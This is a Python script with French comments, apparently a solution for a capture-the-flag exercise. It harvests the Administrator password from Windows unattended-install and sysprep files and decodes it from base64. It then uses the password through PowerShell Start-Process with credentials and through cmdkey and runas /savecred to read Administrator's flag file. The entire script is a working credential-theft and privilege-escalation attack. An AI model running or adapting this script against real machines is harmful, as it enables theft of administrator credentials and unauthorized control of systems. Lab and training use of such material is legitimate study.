import os
import re
import base64
import subprocess

# ─────────────────────────────────────────────
# 1. EMPLACEMENTS DES FICHIERS UNATTENDED
# ─────────────────────────────────────────────
file_paths = [
    r"C:\unattend.xml",
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Unattend\Unattend.xml",
    r"C:\Windows\system32\sysprep.inf",
    r"C:\Windows\system32\sysprep\sysprep.xml",
    r"C:\Windows\system32\sysprep\autounattend.xml",
]

# ─────────────────────────────────────────────
# 2. EXTRACTION PAR REGEX
# ─────────────────────────────────────────────
password_pattern = re.compile(
    r"<AdministratorPassword>\s*<Value>(.*?)</Value>",
    re.IGNORECASE | re.DOTALL
)

def extract_password(file_path):
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            match = password_pattern.search(content)
            if match:
                return match.group(1).strip()
    except Exception as e:
        print(f"[!] Erreur lecture {file_path}: {e}")
    return None

# Scan des fichiers
admin_password = None
for path in file_paths:
    if os.path.exists(path):
        print(f"[*] Fichier trouvé : {path}")
        admin_password = extract_password(path)
        if admin_password:
            print(f"[+] Valeur brute extraite : {admin_password}")
            break
    else:
        print(f"[-] Absent : {path}")

if not admin_password:
    print("[-] Aucun mot de passe trouvé.")
    exit(1)

# ─────────────────────────────────────────────
# 3. DÉCODAGE BASE64
# ─────────────────────────────────────────────
def fix_padding(s):
    return s + "=" * (4 - len(s) % 4) if len(s) % 4 != 0 else s

decoded_password = None
raw = fix_padding(admin_password.strip())

try:
    decoded_bytes = base64.b64decode(raw)
    try:
        decoded_password = decoded_bytes.decode("utf-8").replace("\x00", "").strip()
    except Exception:
        decoded_password = decoded_bytes.decode("utf-16-le").replace("\x00", "").strip()
    print(f"[+] Mot de passe décodé : {decoded_password}")
except Exception:
    decoded_password = admin_password
    print(f"[+] Mot de passe en clair : {decoded_password}")

# ─────────────────────────────────────────────
# 4. RÉCUPÉRATION DU FLAG
# ─────────────────────────────────────────────
print(f"\n[*] Tentative de récupération du flag...")
print(f"[*] Utilisateur : Administrator")
print(f"[*] Mot de passe : {decoded_password}")

# Récupère le nom de la machine
machine_name = os.environ.get("COMPUTERNAME", ".")
print(f"[*] Nom de la machine : {machine_name}")

flag_output = r"C:\Users\Student\Desktop\flag.txt"

# Méthode 1 : lecture directe (si permissions le permettent)
try:
    flag = open(r"C:\Users\Administrator\Desktop\flag.txt", "r").read().strip()
    print(f"\n[+] FLAG (lecture directe) : {flag}")
    exit(0)
except Exception:
    print("[-] Lecture directe refusée, tentative avec credentials...")

# Méthode 2 : Start-Process avec nom machine explicite
ps_script = f"""
$pass = ConvertTo-SecureString '{decoded_password}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('{machine_name}\\Administrator', $pass)
Start-Process powershell -Credential $cred -Wait -NoNewWindow `
    -ArgumentList '-NoProfile -Command "Get-Content C:\\Users\\Administrator\\Desktop\\flag.txt | Out-File -Encoding utf8 C:\\Users\\Student\\Desktop\\flag.txt"'
"""

result = subprocess.run(
    ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
    capture_output=True, text=True, timeout=30
)

if os.path.exists(flag_output):
    with open(flag_output, "r") as f:
        print(f"\n[+] FLAG : {f.read().strip()}")
    exit(0)

print("[-] Start-Process échoué, tentative cmdkey + runas...")

# Méthode 3 : cmdkey + runas /savecred
subprocess.run(
    f'cmdkey /add:localhost /user:Administrator /pass:{decoded_password}',
    shell=True, capture_output=True
)
subprocess.run(
    f'runas /user:Administrator /savecred "cmd.exe /c type C:\\Users\\Administrator\\Desktop\\flag.txt > {flag_output}"',
    shell=True
)

import time
time.sleep(3)

if os.path.exists(flag_output):
    with open(flag_output, "r") as f:
        print(f"\n[+] FLAG : {f.read().strip()}")
else:
    print("\n[!] Toutes les méthodes automatiques ont échoué.")
    print(f"[*] Mot de passe récupéré : {decoded_password}")
    print(f"[*] Lance manuellement : runas /user:{machine_name}\\Administrator cmd.exe")
    print(f"[*] Puis : type C:\\Users\\Administrator\\Desktop\\flag.txt")
